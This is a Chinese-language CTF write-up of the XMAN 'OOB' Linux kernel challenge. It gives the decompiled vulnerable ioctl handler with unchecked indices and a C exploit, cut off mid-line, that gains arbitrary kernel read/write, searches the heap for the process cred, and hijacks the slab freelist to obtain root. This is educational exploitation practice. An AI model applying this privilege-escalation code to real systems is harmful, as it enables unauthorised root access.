<h3 id="xman结营赛-OOB"><a href="#xman结营赛-OOB" class="headerlink" title="xman结营赛 OOB"></a>xman结营赛 OOB</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>这个题坑还挺多的(还是我太菜了)，启动脚本去掉定时关机，去掉aslr方便调试。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#echo "[+]starting qemu-"</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null \</span><br><span class="line">    -s</span><br><span class="line"><span class="comment">#echo "[-]boot end"</span></span><br></pre></td></tr></table></figure>
<p>新建一个文件夹把cpio拷进去，执行<code>cpio -dmv &lt; rootfs.cpio</code>解压出文件系统，到./etc/init.d里去改rcS(这里的init脚本为空)，初始脚本里没有挂载<code>/sys</code>目录导致我们没法看更多信息(lsmod可以查看模块.text的加载基址)，可以先拿root起，方便看函数地址等。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/OOB.ko</span><br><span class="line">chmod 644 /dev/OOB</span><br><span class="line">chmod -R 777 /sys/</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line">chown -R root /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chown -R 1000:1000 .</span><br><span class="line"><span class="comment">#chown -R 0:0 .</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"><span class="comment">#poweroff -f</span></span><br></pre></td></tr></table></figure>
<p>另外进去之后看一眼/dev/OOB的权限会发现普通用户是只读的，我平时<code>open</code>的时候参数习惯为<code>2</code>表示可读写，现在普通用户只能为<code>0</code>，否则文件打开会失败。</p>
<p>OOB.ko里其实只有一个<code>ioctl</code>，里面有四个命令，分别对应<code>Malloc</code>、<code>Free</code>、<code>Write</code>和<code>Read</code>，仔细观察一下我们可以控制<code>idx</code>、<code>user_buf</code>、<code>stack_size</code>和<code>stack_idx</code>而在R/W的时候没有对<code>idx</code>进行检查，虽然他是一个unsigned int的类型，但是我们可以往前任意读，我们Malloc的对象是一个0x100大小的对象，其地址作为obj的addr和0x100存储在bss上，如果bss_list高地址有一些数据满足条件我们就可以任意读了(<code>stack_idx + stack_size &lt;= obj_idx1-&gt;size</code>)这里的stack_idx可以看成addr的offset(单字节)，stack_size为我们想读取的数据大小，其相加小于<code>size</code>，因为我们不能事先在bss上写东西，因此只能往前找满足条件的fake_obj。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 object          struc ; (sizeof=0x10, align=0x8, copyof_484)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: .bss:pool/r</span></span><br><span class="line"><span class="comment">00000000 addr            dq ?                    ; XREF: oob_ioctl+5F/r</span></span><br><span class="line"><span class="comment">00000000                                         ; oob_ioctl+110/r ... ; offset</span></span><br><span class="line"><span class="comment">00000008 size            dq ?</span></span><br><span class="line"><span class="comment">00000010 object          ends</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">oob_ioctl</span><span class="params">(__int64 arg1, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg2, __int64 arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> arg22; <span class="comment">// ebx</span></span><br><span class="line">  __int64 arg33; <span class="comment">// rsi</span></span><br><span class="line">  __int64 idx1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *obj_idx1_addr; <span class="comment">// rsi</span></span><br><span class="line">  object *obj_idx1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// r13</span></span><br><span class="line">  object *obj_idx; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">bool</span> obj_addr; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">void</span> *alloc_addr; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  __int64 idx2; <span class="comment">// rax</span></span><br><span class="line">  __int64 addr_idx2; <span class="comment">// rdi</span></span><br><span class="line">  object *v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// rdi</span></span><br><span class="line">  object *v19; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  __int64 stack_size; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  __int64 stack_idx; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  arg22 = arg2;</span><br><span class="line">  arg33 = arg3;</span><br><span class="line">  copy_from_user(&amp;idx, arg3, <span class="number">0x20</span>LL);           <span class="comment">// idx可控</span></span><br><span class="line">  <span class="keyword">if</span> ( arg22 != <span class="number">0x30001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg22 &lt;= <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg22 == <span class="number">0x30000</span> )                   <span class="comment">// 0x30000-&gt;malloc</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = user_buf;</span><br><span class="line">        JUMPOUT(*(&amp;obj_num + <span class="number">0x40000000</span>), <span class="number">9</span>, oob_ioctl_cold_0);<span class="comment">// obj_num大于9跳转</span></span><br><span class="line">        obj_idx = &amp;pool[idx];                   <span class="comment">// no check </span></span><br><span class="line">        obj_addr = obj_idx-&gt;addr == <span class="number">0L</span>L;</span><br><span class="line">        obj_idx-&gt;size = <span class="number">0x100</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( obj_addr )</span><br><span class="line">        &#123;</span><br><span class="line">          alloc_addr = (<span class="keyword">void</span> *)kmem_cache_alloc(kmalloc_caches[<span class="number">8</span>], <span class="number">0x6000C0</span>LL);<span class="comment">// malloc 0x100</span></span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)alloc_addr &gt; <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            obj_idx-&gt;addr = alloc_addr;</span><br><span class="line">            v13 = <span class="number">0L</span>L;</span><br><span class="line">            copy_from_user(alloc_addr, v9, <span class="number">0x100</span>LL);<span class="comment">// copy stack addr to heap</span></span><br><span class="line">            <span class="keyword">return</span> v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg22 != <span class="number">0x30002</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( arg22 == <span class="number">0x30003</span> )                 <span class="comment">// 0x30003</span></span><br><span class="line">        &#123;</span><br><span class="line">          idx1 = idx;</span><br><span class="line">          obj_idx1_addr = (<span class="keyword">char</span> *)pool[idx1].addr;</span><br><span class="line">          obj_idx1 = &amp;pool[idx1];               <span class="comment">// idx1无检查</span></span><br><span class="line">          <span class="keyword">if</span> ( obj_idx1_addr )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( stack_idx + stack_size &lt;= obj_idx1-&gt;size )</span><br><span class="line">            &#123;</span><br><span class="line">              copy_to_user(user_buf, &amp;obj_idx1_addr[stack_idx], stack_size);<span class="comment">// arbRead</span></span><br><span class="line">              <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      idx2 = idx;                               <span class="comment">// 0x30002</span></span><br><span class="line">      addr_idx2 = (__int64)pool[idx2].addr;</span><br><span class="line">      v16 = &amp;pool[idx2];</span><br><span class="line">      <span class="keyword">if</span> ( addr_idx2 &amp;&amp; stack_idx + stack_size &lt;= v16-&gt;size )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user(stack_idx + addr_idx2, user_buf, stack_size);<span class="comment">// arbWrite</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  idx3 = idx;                                   <span class="comment">// 0x30001-&gt;free</span></span><br><span class="line">  v18 = pool[idx3].addr;</span><br><span class="line">  v19 = &amp;pool[idx3];</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  kfree(v18, arg33);</span><br><span class="line">  v19-&gt;addr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一番努力之后终于找到了满足条件的地方，bss_list地址为<code>0xffffffffa0002420</code>，用这个obj我们可以读取<code>[0x000d00620000002e,0x000d00620000002e+0xffffffffa0002420)</code>范围内的地址的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xffffffffa0003090:     0x000d00620000002e     0xffffffffa0002420</span><br><span class="line">0xffffffffa00030a0:     0x0000000000000500      0x000b006400000033</span><br></pre></td></tr></table></figure>
<p>显然<code>bss_list</code>是满足这个条件的</p>
<p><img src="/2020/09/03/kernel/1.png" alt="alloc"></p>
<p>尝试多次分配，发现分配12次之后之前的slub缓存就用完了，会用Buddy分配新的一块区域供继续分配，至此我们的思路就有了，分配完这些内存然后<code>fork</code>一个进程，触发创建新的<code>cred</code>对象，这个对象地址一定在<code>0x*17df00</code>和<code>0x*1e3f100</code>之间，我们就可以爆破这块内存区域，寻找我们prctl设置的进程名，进而搜到cred。</p>
<p>下一步用任意地址读读取cred里前0x100的内容，修改前0x28字节为usr_buf。再用任意地址写写到free后的slab的fd，两次Malloc可以得到cred对象，把usr_buf拷贝进去后即可提权成功。</p>
<p><img src="/2020/09/03/kernel/2.png" alt="root"></p>
<h4 id="exp-c-4"><a href="#exp-c-4" class="headerlink" title="exp.c"></a>exp.c</h4><p>这里还有地方是我没想明白的，就是我以为自己修改的cred是子进程里的，没想到就是本进程的，之前一直在子进程起shell，卡了很久</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MallocCmd  0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FreeCmd    0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WriteCmd   0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ReadCmd    0x30003</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSZ   0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> usr_buf[BUFSZ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">attr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125; Attr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx,<span class="keyword">char</span>* ini_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ini_buf;</span><br><span class="line">    ioctl(fd,MallocCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc1</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx,<span class="keyword">size_t</span>* ini_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ini_buf;</span><br><span class="line">    ioctl(fd,MallocCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    ioctl(fd,FreeCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> obj_idx,<span class="keyword">size_t</span> addr_idx,<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = obj_idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)usr_buf;</span><br><span class="line">    input[<span class="number">2</span>] = size;</span><br><span class="line">    input[<span class="number">3</span>] = addr_idx;</span><br><span class="line">    ioctl(fd,ReadCmd,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> obj_idx,<span class="keyword">size_t</span> addr_idx,<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = obj_idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)usr_buf;</span><br><span class="line">    input[<span class="number">2</span>] = size;</span><br><span class="line">    input[<span class="number">3</span>] = addr_idx;</span><br><span class="line">    ioctl(fd,WriteCmd,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LongToStr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> high_4 = addr &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> low_4 = addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    usr_buf[<span class="number">0</span>] = low_4 &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">1</span>] = (low_4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">2</span>] = (low_4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">3</span>] = (low_4 &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">4</span>] = (high_4 &amp; <span class="number">0xff</span>);</span><br><span class="line">    usr_buf[<span class="number">5</span>] = (high_4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">6</span>] = (high_4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">7</span>] = (high_4 &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    usr_buf[<span class="number">9</span>] = <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hidden_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(hidden_str,<span class="string">"ama2in9PwnForMe\x00"</span>,<span class="number">0x10</span>);</span><br><span class="line">    prctl(PR_SET_NAME,hidden_str);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/OOB"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-]open failed!\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> ini_buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    Malloc(fd,<span class="number">0</span>,ini_buf);</span><br><span class="line">    <span class="comment">//Read(fd,0,0x20,0xe0);</span></span><br><span class="line">    <span class="comment">//leak heap</span></span><br><span class="line">    <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,BUFSZ);</span><br><span class="line">    Read(fd,<span class="number">0xc7</span>,<span class="number">0xfff2ff9da00023f2</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> heap_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> hex[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(hex,usr_buf,<span class="number">0x2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]hex:%x\n"</span>,hex[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//heap_base1 = strtoull(usr_buf,usr_buf+0x10,0x10);</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(usr_buf[i] != <span class="string">'\x00'</span>)</span><br><span class="line">            count += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"total count:%d\n"</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;usr_buf[i],<span class="string">"%c"</span>,&amp;tmp);</span><br><span class="line">        tmp = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]char:%x\n"</span>,usr_buf[i]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(&amp;usr_buf[i]) == <span class="number">0</span>)</span><br><span class="line">            tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]tmp:%x\n"</span>,tmp);</span><br><span class="line">        heap_base += (tmp &lt;&lt; (<span class="number">8</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak heap success:0x%llx\n"</span>,heap_base);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x10</span><span class="number">-4</span>;i++)</span><br><span class="line">        Malloc(fd,i,ini_buf);</span><br><span class="line">    <span class="comment">//for(int i = 0;i &lt; 0x10-4;i++)</span></span><br><span class="line">    <span class="comment">//    Free(fd,i);</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//sub processs</span></span><br><span class="line">        <span class="keyword">char</span> hidden_str1[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">strncpy</span>(hidden_str1,<span class="string">"ama2in9PwnForFun"</span>,<span class="number">0x10</span>);</span><br><span class="line">        prctl(PR_SET_NAME,hidden_str1);</span><br><span class="line">        <span class="keyword">while</span>(getuid())&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[-] not yet\n"</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]root"</span>);</span><br><span class="line">        system(<span class="string">"cat /flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fuck </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> start_addr = heap_base;</span><br><span class="line">    <span class="comment">//unsigned long long start_addr = heap_base &amp; 0xfffffff000000000;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> end_addr = heap_base + (<span class="number">0xffff88801e3de000</span><span class="number">-0xffff88800017d400</span>);</span><br><span class="line">    <span class="comment">//unsigned long long end_addr = 0xffffc80000000000;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck start addr:0x%llx\n"</span>,start_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck end addr:0x%llx\n"</span>,end_addr);</span><br><span class="line">    <span class="keyword">size_t</span> off_idx = (start_addr<span class="number">-0xffffffffa0002420</span>) / <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck idx:0x%llx\n"</span>,off_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]finding str:%s\n"</span>,hidden_str);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> target_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;start_addr &lt; end_addr;start_addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//strncpy(ini_buf,usr_buf,8);</span></span><br><span class="line">        <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,BUFSZ);</span><br><span class="line">        <span class="comment">//sprintf(usr_buf,"%llu",&amp;start_addr);</span></span><br><span class="line">        LongToStr(start_addr);</span><br><span class="line">        <span class="comment">//write to the bss</span></span><br><span class="line">        Write(fd,<span class="number">0xc7</span>,<span class="number">0xfff2ff9da00023f2</span>L,<span class="number">0x10</span>);</span><br><span class="line">        <span class="comment">//read to usr_buf</span></span><br><span class="line">        Read(fd,<span class="number">0</span>,<span class="number">0</span>,BUFSZ);</span><br><span class="line">        <span class="comment">//find</span></span><br><span class="line">        result = memmem(usr_buf,BUFSZ,hidden_str,<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span> (result)</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]find success:0x%llx\n"</span>,start_addr);</span><br><span class="line">			cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">			real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">			<span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">				<span class="comment">//printf("[]%lx[]",result-(int)(buf));</span></span><br><span class="line">				target_addr = start_addr + result-(<span class="keyword">int</span>)(usr_buf);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[+]found task_struct 0x%lx\n"</span>,target_addr);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[+]found cred 0x%lx\n"</span>,real_cred);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//slab hijack</span></span><br><span class="line">    <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,BUFSZ);</span><br><span class="line">    LongToStr(cred);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &gt; <span class="number">0</span>;i--)</span><br><span class="line">        Free(fd,i);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,heap_base+<span class="number">0x100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3000</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">//Read(fd,0xc7,0xfff2ff9da00023f2L,0x8);</span></span><br><span class="line">    Malloc(fd,<span class="number">1</span>,ini_buf);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x10</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3000</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="keyword">final</span>[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(<span class="keyword">final</span>,<span class="string">'\x00'</span>,<span class="keyword">sizeof</span>(<span class="keyword">final</span>));</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span 